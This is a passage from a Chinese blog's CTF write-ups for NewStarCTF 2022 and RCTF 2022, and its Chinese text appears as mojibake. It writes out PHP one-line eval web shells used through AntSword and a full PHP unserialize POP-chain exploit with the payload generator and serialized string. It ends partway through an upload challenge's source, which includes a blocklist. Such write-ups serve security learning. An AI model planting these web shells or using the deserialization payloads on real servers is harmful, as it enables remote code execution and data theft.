<p>xssæˆ‘è¯•äº†ï¼Œæ²¡æœ‰ç»“æœï¼Œç°åœ¨çš„xssåˆ©ç”¨å±‚é¢å’Œå±å®³ä¹Ÿä¸é«˜äº†ï¼ˆå¯èƒ½æ˜¯æˆ‘æŠ€æœ¯ä¸åˆ°ä½ï¼‰</p>
<hr>
<p>æ’å…¥ä¸€å¥è¯ğŸ</p>
<p>å¼€å§‹å› ä¸ºæ˜¯<code>html</code>ï¼Œæˆ‘æ˜¯è¯•äº†<code>jsp</code>ä¸€å¥è¯</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">&quot;cmd&quot;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ç”¨èšå‰‘è¿ä¸ä¸Š</p>
<p>æœ€åæŒ‰ç…§ä¼ ç»Ÿæ€è·¯ï¼Œæˆ‘åœ¨åé¢æ’å…¥<code>php</code>ä¸€å¥è¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¥½å®¶ä¼™ï¼Œä¼ ç»Ÿæ€è·¯ï¼Œæ‰æ˜¯çœŸ</p>
<p>è¿æ¥æˆåŠŸæ‹¿åˆ°<code>flag</code></p>
<hr>
<p>ä¸çŸ¥é“æœ‰æ²¡æœ‰çœ‹åˆ°è¿™ç¯‡æ–‡ç« çš„åŒå­¦çœ‹åˆ°è¿™ä¸ª<code>wp</code>ï¼Œæé†’ä¸€ä¸‹ï¼Œè¿™é‡Œéœ€è¦åœ¨<code>http body</code>é‡Œè¡¥å……<code>num</code>è¯·æ±‚ä¿¡æ¯</p>
<p>å› ä¸ºè¿™ä¹Ÿæ˜¯ç»•è¿‡çš„ä¸€ä¸ªç¯èŠ‚</p>
<p><img src="/post/2022NewStarCTF/image-20220921084836402.png" alt="image-20220921084836402"></p>
<hr>
<h2 id="2-UnserializeOne"><a href="#2-UnserializeOne" class="headerlink" title="2.UnserializeOne"></a>2.UnserializeOne</h2><p>ä¸€é“<code>popchain</code>ï¼Œè¿™è¿˜æ˜¯æˆ‘ç¬¬ä¸€æ¬¡åš<code>popchain</code>ç±»ã€æƒ­æ„§ï¼Œä¸è¿‡åšç€çœŸæœ‰æ„æ€ã€‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ„é€ <code>pop</code>é“¾ä¸»è¦åœ¨äºï¼Œ</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">æŠŠæˆ‘ä»¬éœ€è¦è§¦å‘çš„é­”æœ¯æ–¹æ³•è”ç³»åœ¨ä¸€èµ·ï¼Œè€Œä¸”åœ¨è”ç³»è§¦å‘è¿‡ç¨‹ä¸­ä¹Ÿè¦è®°å¾—å®ä¾‹åŒ–ç›®æ ‡ç±»ï¼Œè¿™æ ·æ‰èƒ½è°ƒç”¨å’Œæ‰§è¡Œå…¶ä¸­çš„æ–¹æ³•</span><br></pre></td></tr></table></figure>



<p>æˆ‘ä»¬å…ˆä¸­æ¯ä¸ªç±»å…¶ä¸­çš„é­”æœ¯æ–¹æ³•åˆ—å‡ºæ¥çœ‹çœ‹ï¼Œå†åˆ†æä¸€ä¸‹</p>
<p><code>Start</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     //<span class="title">__destruct</span>(<span class="params"></span>)ï¼Œå¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘ï¼Œä¹Ÿå°±æ˜¯æœ€åè¿è¡Œç»“æŸæ—¶è§¦å‘</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">      <span class="comment">//è¿™é‡Œè¿›è¡Œecho $this-&gt;nameï¼Œå¦‚æœ$this-&gt;nameæ˜¯ä¸€ä¸ªç±»å°±ä¼šè°ƒç”¨Sec()ç±»é‡Œ__toString()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">   //<span class="title">__isset</span>(<span class="params"></span>)ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨<span class="title">isset</span>(<span class="params"></span>)æˆ–<span class="title">empty</span>(<span class="params"></span>)æ—¶è°ƒç”¨</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="comment">//è¿™é‡ŒæŠŠ$this-&gt;funcå½“ä½œä¸€ä¸ªå‡½æ•°ï¼Œæ‰§è¡Œ$this-&gt;func()</span></span><br><span class="line">        <span class="comment">//å¦‚æœ$this-&gt;funcä¸æ˜¯ä¸€ä¸ªæ­£ç¡®çš„å‡½æ•°åï¼Œå°±ä¼šè°ƒç”¨Secç±»é‡Œ__invoke()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Sec</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  //<span class="title">__toString</span>(<span class="params"></span>)ï¼ŒæŠŠç±»å½“åšå­—ç¬¦ä¸²æ—¶è§¦å‘ï¼Œ</span></span><br><span class="line"><span class="function">  //æ‰€ä»¥åœ¨<span class="title">Start</span>ç±»ä¸­çš„[<span class="title">echo</span> &quot;<span class="title">Welcome</span> <span class="title">to</span> <span class="title">NewStarCTF</span>, &quot;.$<span class="title">this</span>-&gt;<span class="title">name</span></span>;]ï¼Œå°±éœ€è¦æŠŠnameå€¼èµ‹å€¼ä¸ºSecç±»å</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">       <span class="comment">//è¿™é‡Œæƒ³è°ƒç”¨this-&gt;objçš„checkæ–¹æ³•</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     //<span class="title">__invoke</span>(<span class="params"></span>)ï¼Œå½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br><span class="line"><span class="function">   //æ‰€ä»¥åœ¨<span class="title">Start</span>ç±»ä¸­çš„[$<span class="title">this</span>-&gt;<span class="title">func</span>)(<span class="params"></span>)</span>;]ä¸­ï¼Œéœ€è¦æŠŠfuncå€¼èµ‹å€¼ä¸ºSecï¼Œä»è€ŒæŠŠå…¶å½“ä½œå‡½æ•°æ‰§è¡Œæ—¶ï¼Œä»è€Œè§¦å…¶é­”æœ¯æ–¹æ³•</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">      <span class="comment">//è¿™é‡Œå°±æ˜¯ç›®æ ‡ï¼Œæ‰§è¡Œæ–‡ä»¶åŒ…å«flagè¾“å‡ºå†…å®¹</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Easy</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">   //<span class="title">__call</span>(<span class="params"></span>)ï¼Œåœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="function">   //æ‰€ä»¥åœ¨<span class="title">Sec</span>ç±»ä¸­ï¼Œå½“<span class="title">this</span>-&gt;<span class="title">obj</span>èµ‹å€¼ä¸º<span class="title">Easy</span>ç±»æ—¶ï¼Œè°ƒç”¨<span class="title">check</span>æ–¹æ³•æ—¶ï¼Œå°±ä¼šè§¦å‘ï¼Œå› ä¸º<span class="title">Easy</span>é‡Œæ²¡æœ‰<span class="title">check</span>å‡½æ•°</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//è¿™é‡Œè°ƒç”¨cloneï¼Œå½“å¯¹è±¡å®Œæˆå¤åˆ¶æ—¶ä¼šæ‰§è¡Œeeeeé‡Œçš„__clone</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>eeee</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="comment">//è¿™é‡Œæ˜¯å¯¹$this-&gt;objçš„cmdå±æ€§ä½¿ç”¨issetå‡½æ•°ï¼Œä½†æ˜¯å¹¶ä¸å­˜åœ¨cmdå±æ€§</span></span><br><span class="line">            <span class="comment">//æ‰€ä»¥æŠŠthis-&gt;objèµ‹å€¼ä¸ºStratç±»åï¼Œä»è€Œè§¦å‘__isset</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>æ•´ç†ä¸€ä¸‹</p>
<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line">Start::__destruct</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Sec::__toString</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Easy::__call</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">eeee::__clone</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Start::__isset</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Sec::__invoke</span><br></pre></td></tr></table></figure>

<p>äºæ˜¯<code>payload</code>ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$sec</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$easy</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$eeee</span>=<span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>-&gt;name=<span class="variable">$sec</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;func=<span class="variable">$sec</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sec</span>-&gt;obj=<span class="variable">$easy</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;<span class="keyword">var</span>=<span class="variable">$eeee</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$eeee</span>-&gt;obj=<span class="variable">$start</span>;</span><br><span class="line"><span class="comment">//å› ä¸ºè¿™é‡ŒæŠŠeeeeé‡Œçš„å˜é‡å¤åˆ¶ä¸ºå®ä¾‹åŒ–çš„Startçš„ç±»ï¼Œæ‰€ä»¥å¦‚æœä»eeeeç±»ä¸ºå¼€å§‹åºåˆ—åŒ–çš„å…¥å£ä¹Ÿæ˜¯å¯ä»¥çš„</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>);</span><br><span class="line"><span class="comment">//echo serialize($eeee);</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°åºåˆ—åŒ–æ•°æ®ï¼Œ<code>post</code>ä¼ å…¥å°±è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Start&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Sec&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Easy&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cla&quot;</span>;N;&#125;s:<span class="number">3</span>:<span class="string">&quot;var&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;eeee&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;r:<span class="number">1</span>;&#125;&#125;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;r:<span class="number">2</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;N;&#125;s:3:&quot;var&quot;;r:1;&#125;s:4:&quot;func&quot;;r:3;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/2022NewStarCTF/image-20221027162117156.png" alt="image-20221027162117156"></p>
<hr>
<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>2022RCTF</title>
    <url>//post/2022RCTF/</url>
    <content><![CDATA[<p><code>å­¦åˆ°å¾ˆå¤š</code></p>
<span id="more"></span>

<h1 id="RCTF2022"><a href="#RCTF2022" class="headerlink" title="RCTF2022"></a>RCTF2022</h1><h2 id="easyupload"><a href="#easyupload" class="headerlink" title="easyupload"></a>easyupload</h2><blockquote>
<p>é™„ä»¶</p>
<p><a href="https://adworld.xctf.org.cn/media/file/task/0e2ca001-097f-437c-b5ae-a9e04773b9bc.tar">https://adworld.xctf.org.cn/media/file/task/0e2ca001-097f-437c-b5ae-a9e04773b9bc.tar</a></p>
</blockquote>
<p><img src="/post/2022RCTF/image-20230122145933429.png" alt="image-20230122145933429"></p>
<p>è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®ï¼Œé¢˜ç›®å¼€å§‹ç»™å‡ºäº†é¢˜ç›®é™„ä»¶ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹æºç æŸ¥çœ‹ä¸Šä¼ æ–‡ä»¶è¿‡æ»¤å“ªäº›ä¸œè¥¿</p>
<p>æ ¸å¿ƒå°±æ˜¯ä¸€ä¸ª<code>UploadController.php</code>æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Filesystem</span>\<span class="title">Path</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Annotation</span>\<span class="title">Route</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Bundle</span>\<span class="title">FrameworkBundle</span>\<span class="title">Controller</span>\<span class="title">AbstractController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadController</span> <span class="keyword">extends</span> <span class="title">AbstractController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;BASE64&quot;</span>,<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext_blacklist = [</span><br><span class="line">            <span class="string">&quot;php&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ini&quot;</span>,</span><br><span class="line">            <span class="string">&quot;phtml&quot;</span>,</span><br><span class="line">            <span class="string">&quot;htaccess&quot;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_blacklist = [<span class="string">&quot;&lt;?&quot;</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;handler&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalid</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;error occurs: <span class="subst">$msg</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#[Route</span>(<span class="string">&#x27;/&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;upload&#x27;</span>)<span class="meta">]</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadHtml</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file</span> = @<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file</span> == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">                <span class="comment">//&#x27;&lt;p&gt;Before start you should know that it\&#x27;s not a good challenge.You can\&#x27;t get anything from this challenge.If you hate this challenge, just skip plz. &lt;/p&gt;&lt;p&gt;è¿™é“é¢˜å¹¶ä¸æ˜¯ä¸€é“å¥½é¢˜ï¼Œä½ ä¸ä¼šä»è¿™é“é¢˜ä¸Šè·å¾—ä»»ä½•ä¸œè¥¿ã€‚å¦‚æœä½ è®¨åŒè¿™é“é¢˜å°±ç›´æ¥è·³è¿‡å§ã€‚&lt;/p&gt;&#x27;</span></span><br><span class="line">                <span class="variable">$uploadHtml</span></span><br><span class="line">            );</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="variable">$charset</span> = <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$content</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$charset</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">                    <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking invalid format.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$ext</span> = <span class="title class_">Path</span>::<span class="title function_ invoke__">getExtension</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;..&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking path travel&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;ext_blacklist <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$ext</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable 